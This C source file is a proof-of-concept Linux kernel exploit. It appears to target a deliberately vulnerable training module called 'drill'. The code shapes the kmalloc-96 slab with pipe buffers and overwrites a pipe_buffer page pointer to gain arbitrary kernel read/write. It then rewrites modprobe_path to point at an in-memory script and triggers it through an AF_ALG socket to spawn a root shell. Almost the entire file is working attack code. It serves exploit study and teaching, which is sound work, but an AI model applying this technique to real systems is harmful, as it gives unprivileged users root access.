/*
 * Funny experiments with Linux kernel exploitation:
 * a basic out-of-bounds writing exploit corrupting the `pipe_buffer.page` pointer
 * to perform arbitrary address reading and writing (AARW) of kernel memory via a pipe.
 *
 * Only basic methods. Just for fun.
 *
 * 1) Use Linux kernel version v6.18 tag (7d0a66e4bb9081d75c82ec4957c50034cb0ea449)
 *
 * 2) Use gcc version 13.3.0
 *
 * 3) Change these options in `defconfig`:
 *   - CONFIG_CONFIGFS_FS=y
 *   - CONFIG_SECURITYFS=y
 *   - CONFIG_DEBUG_INFO=y
 *   - CONFIG_DEBUG_INFO_DWARF5=y
 *   - CONFIG_GDB_SCRIPTS=y
 *
 * 4) Ensure that the CONFIG_RANDOM_KMALLOC_CACHES option is not set to allow
 *    the drill_item_t and pipe_buffer objects to live in the same slab cache.
 *
 * 5) However, you may compile the Linux kernel with slab freelist randomization enabled
 *    (CONFIG_SLAB_FREELIST_RANDOM=y). This PoC can bypass that hardening feature.
 *
 * 6) Run the kernel with disabled KASLR (use the nokaslr boot parameter).
 *
 * This PoC overwrites modprobe_path and gains LPE.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <linux/if_alg.h>
#include "drill.h"

/* clang-format off */
/*
 * Estimate the number of free slots in the kmalloc-96 slabs.
 * In /proc/slabinfo on the target VM we see that:
 * 	num_objs - active_objs = 5670 - 5505 = 165
 * Let's multiply this number by 3.
 */
#define KMALLOC96_HOLES_N	495
#define OBJS_PER_SLAB		42
/*
 * How many pipes do we need:
 * 1) KMALLOC96_HOLES_N to plug the holes in the kmalloc-96 slab cache;
 * 2) OBJS_PER_SLAB to allocate a new active slab, where we will place drill_item_t;
 * 3) OBJS_PER_SLAB to fill that slab completely after allocating drill_item_t.
 */
#define PIPES_N			(KMALLOC96_HOLES_N + OBJS_PER_SLAB * 2)

/* The following formula is valid only when KASLR is disabled */
#define MODPROBE_PATH_VADDR	0xffffffff82d486a0UL
#define KERNEL_TEXT_VADDR	0xffffffff81000000UL
#define MODPROBE_PATH_OFFSET	(MODPROBE_PATH_VADDR - KERNEL_TEXT_VADDR)
#define KERNEL_TEXT_PHYS_ADDR 	0x1000000UL
#define STRUCT_PAGE_SZ		64UL
#define VMEMMAP_BASE		0xffffea0000000000UL
#define MODPROBE_PATH_PAGE_OFFSET \
	((KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_OFFSET) >> 12) * STRUCT_PAGE_SZ
#define MODPROBE_PATH_PAGE_ADDR	(VMEMMAP_BASE + MODPROBE_PATH_PAGE_OFFSET)
/* clang-format on */

int increase_fd_limit(void)
{
	struct rlimit rlim;

	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
		perror("[-] getrlimit");
		return EXIT_FAILURE;
	}

	rlim.rlim_cur = rlim.rlim_max;
	if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
		perror("[-] setrlimit");
		return EXIT_FAILURE;
	}

	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
		perror("[-] getrlimit");
		return EXIT_FAILURE;
	}

	printf("[+] increased max file descriptor number to %ld\n", rlim.rlim_cur);
	return EXIT_SUCCESS;
}

int do_cpu_pinning(int cpu_n)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(cpu_n, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #%d\n", cpu_n);
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/* From include/linux/kmod.h */
#define KMOD_PATH_LEN 256

int get_modprobe_path(char *buf, size_t buf_size)
{
	int fd = -1;
	ssize_t bytes = 0;
	int ret = EXIT_FAILURE;
	size_t len = 0;

	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
	if (fd < 0) {
		perror("[-] open modprobe");
		return EXIT_FAILURE;
	}

	bytes = read(fd, buf, buf_size);
	buf[buf_size - 1] = 0;

	ret = close(fd);
	if (ret != 0)
		perror("[-] close modprobe");

	if (bytes < 0) {
		perror("[-] read modprobe");
		return EXIT_FAILURE;
	}

	len = strlen(buf);
	if (len < 1) {
		printf("[-] invalid contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	if (buf[len - 1] != '\n') {
		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	buf[len - 1] = 0; /* skip the line feed '\n' */

	return EXIT_SUCCESS;
}

/* Fileless approach */
int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
{
	pid_t pid = getpid();
	int script_fd = -1;
	int shell_stdin_fd = -1;
	int shell_stdout_fd = -1;
	int ret = EXIT_FAILURE;

	script_fd = memfd_create("", MFD_CLOEXEC);
	if (script_fd < 0) {
		perror("[-] memfd_create");
		return EXIT_FAILURE;
	}

	shell_stdin_fd = dup(STDIN_FILENO);
	if (shell_stdin_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	shell_stdout_fd = dup(STDOUT_FILENO);
	if (shell_stdout_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	ret = dprintf(script_fd,
		      "#!/bin/sh\n"
		      "echo \"%s\" > /proc/sys/kernel/modprobe\n"
		      "/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
		      modprobe_path, pid, shell_stdin_fd, pid, shell_stdout_fd);
	if (ret < 0) {
		perror("[-] dprintf for privesc_script");
		return EXIT_FAILURE;
	}

	ret = lseek(script_fd, 0, SEEK_SET);
	if (ret < 0) {
		perror("[-] lseek for privesc_script");
		return EXIT_FAILURE;
	}

	ret = snprintf(path, path_size, "/proc/%i/fd/%i", pid, script_fd);
	if (ret < 0) {
		perror("[-] snprintf for privesc_script path");
		return EXIT_FAILURE;
	}
	if (ret >= path_size) {
		printf("[-] snprintf for privesc_script path: truncated\n");
		return EXIT_FAILURE;
	}

	printf("[+] privesc script is prepared at %s\n", path);
	return EXIT_SUCCESS;
}

int find_and_change_modprobe_path(char *pipe_data, char *modprobe_path,
				  char *privesc_script_path)
{
	size_t modprobe_path_len = strlen(modprobe_path);
	unsigned long modprobe_path_start = MODPROBE_PATH_VADDR & (PAGE_SIZE - 1);
	size_t privesc_script_path_len = strlen(privesc_script_path);
	int ret = -1;

	assert(modprobe_path_start + modprobe_path_len < PAGE_SIZE);
	ret = strncmp(pipe_data + modprobe_path_start, modprobe_path, modprobe_path_len);
	if (ret != 0)
		return EXIT_FAILURE;

	assert(modprobe_path_start + privesc_script_path_len < PAGE_SIZE);
	strncpy(pipe_data + modprobe_path_start, privesc_script_path, privesc_script_path_len);
	return EXIT_SUCCESS;
}

/* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
void trigger_modprobe_sock(void)
{
	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
	int alg_fd = -1;

	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
	printf("[!] root shell is finished\n");

	if (alg_fd >= 0) {
		if (close(alg_fd) < 0)
			perror("[-] close alg_fd");
	}
}

int main(void)
{
	int result = EXIT_FAILURE;
	int ret = EXIT_FAILURE;
	char modprobe_path[KMOD_PATH_LEN] = { 0 };
	char new_modprobe_path[KMOD_PATH_LEN] = { 0 };
	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
	int act_fd = -1;
	long i = 0;
	long corrupted_pipe_n = 0;
	int pipe_fds[PIPES_N][2];
	char *pipe_data = NULL;
	ssize_t bytes = -1;
	char act_args[DRILL_ACT_SIZE] = { 0 };

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	ret = increase_fd_limit();
	if (ret == EXIT_FAILURE)
		goto end;

	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
	if (ret == EXIT_FAILURE)
		goto end;

	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path),
				     modprobe_path);
	if (ret == EXIT_FAILURE)
		goto end;

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning(0) == EXIT_FAILURE)
		goto end;

	for (i = 0; i < PIPES_N; i++) {
		pipe_fds[i][0] = -1;
		pipe_fds[i][1] = -1;
	}

	pipe_data = malloc(PAGE_SIZE);
	if (pipe_data == NULL) {
		perror("[-] malloc");
		goto end;
	}
	memset(pipe_data, 0, PAGE_SIZE);

	for (i = 0; i < PIPES_N; i++) {
		ret = pipe(pipe_fds[i]);
		if (ret < 0) {
			perror("[-] pipe");
			goto end;
		}

		/*
		 * Change the pipe_buffer array size to 2 * sizeof(struct pipe_buffer),
		 * which is 80 bytes. It should live in kmalloc-96 together with
		 * the drill_item_t object.
		 *
		 * We should resize the pipe capacity right now to avoid hitting
		 * the limit in /proc/sys/fs/pipe-user-pages-soft.
		 */
		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * 2);
		if (ret != PAGE_SIZE * 2) {
			perror("[-] fcntl");
			goto end;
		}

		/* Fill one page in this pipe */
		bytes = write(pipe_fds[i][1], pipe_data, PAGE_SIZE);
		if (bytes != PAGE_SIZE) {
			printf("[-] write to pipe returned %zd\n", bytes);
			goto end;
		}

		/*
		 * Let's allocate a drill_item_t object after filling the empty slots
		 * in kmalloc-96 and creating a new slab containing pipe_buffers.
		 * After placing the drill_item_t object in this slab, we will allocate
		 * OBJS_PER_SLAB more pipe_buffers to fill it completely.
		 */
		if (i == KMALLOC96_HOLES_N + OBJS_PER_SLAB) {
			ret = act(act_fd, DRILL_ACT_ALLOC, 0, NULL);
			if (ret == EXIT_FAILURE)
				goto end;
			printf("[+] allocated a vulnerable drill_item_t object\n");
		}
	}
	printf("[+] allocated pipe_buffer objects and a drill_item_t object among them\n");

	/*
	 * Overwrite pipe_buffer.page:
	 *  - the page field in pipe_buffer is at the offset 0;
	 *  - DRILL_ACT_SAVE_VAL with 80 as 2nd argument starts at the offset 96,
	 *    which is exactly at the offset 0 of the next object near drill_item_t.
	 */
	printf("[*] try to overwrite pipe_buffer.page after drill_item_t with 0x%lx\n",
			MODPROBE_PATH_PAGE_ADDR);
	snprintf(act_args, sizeof(act_args), "0x%lx 80", MODPROBE_PATH_PAGE_ADDR);
	ret = act(act_fd, DRILL_ACT_SAVE_VAL, 0, act_args);
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	printf("[*] searching the corrupted pipe containing modprobe_path...\n");
	for (i = 0; i < PIPES_N; i++) {
		/*
		 * Read the whole page to make the kernel discard the first pipe_buffer
		 * and save its page pointer into the pipe_inode_info.tmp_page array.
		 */
		bytes = read(pipe_fds[i][0], pipe_data, PAGE_SIZE);
		if (bytes != PAGE_SIZE) {
			printf("[-] read from pipe returned %zd\n", bytes);
			goto end;
		}

		ret = find_and_change_modprobe_path(pipe_data, modprobe_path, privesc_script_path);
		if (ret == EXIT_FAILURE)
			continue;

		printf("[+] modprobe_path %s is found in the pipe %ld\n", modprobe_path, i);
		corrupted_pipe_n = i;

		/* Write the page with modified modprobe_path back to the pipe */
		bytes = write(pipe_fds[corrupted_pipe_n][1], pipe_data, PAGE_SIZE);
		if (bytes != PAGE_SIZE) {
			printf("[-] write to pipe returned %zd\n", bytes);
			goto end;
		}

		printf("[+] wrote the page containing new modprobe_path %s back to the pipe %ld\n",
				privesc_script_path, corrupted_pipe_n);
		break;
	}

	/* Check that the modprobe_path is actually overwritten */
	ret = get_modprobe_path(new_modprobe_path, sizeof(new_modprobe_path));
	if (ret == EXIT_FAILURE)
		goto end;

	ret = strncmp(new_modprobe_path, privesc_script_path, KMOD_PATH_LEN);
	if (ret != 0) {
		printf("[-] new modprobe_path %s is not privesc_script_path %s\n",
				new_modprobe_path, privesc_script_path);
		goto end;
	}
	printf("[+] overwritten modprobe_path: %s\n", new_modprobe_path);

	trigger_modprobe_sock();
	result = EXIT_SUCCESS;

	/* Check that the modprobe_path is restored by the privesc script */
	ret = get_modprobe_path(new_modprobe_path, sizeof(new_modprobe_path));
	if (ret == EXIT_FAILURE)
		goto end;

	ret = strncmp(new_modprobe_path, modprobe_path, KMOD_PATH_LEN);
	if (ret != 0) {
		printf("[-] the privesc script failed to restore modprobe_path: %s\n",
				new_modprobe_path);
		goto end;
	}
	printf("[+] restored modprobe_path: %s\n", new_modprobe_path);

end:
	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	if (pipe_data)
		free(pipe_data);

	for (i = 0; i < PIPES_N; i++) {
		if (i == corrupted_pipe_n)
			continue;

		if (pipe_fds[i][0] >= 0) {
			if (close(pipe_fds[i][0]) < 0)
				perror("[-] close pipe");
		}
		if (pipe_fds[i][1] >= 0) {
			if (close(pipe_fds[i][1]) < 0)
				perror("[-] close pipe");
		}
	}

	if (result == EXIT_FAILURE)
		printf("\n[-] exploit failed\n");
	else
		printf("\n[+] success, the end\n");

	ret = daemon(1, 1);
	if (ret != 0)
		perror("[-] daemon");
	while (1)
		sleep(42);

	return result;
}
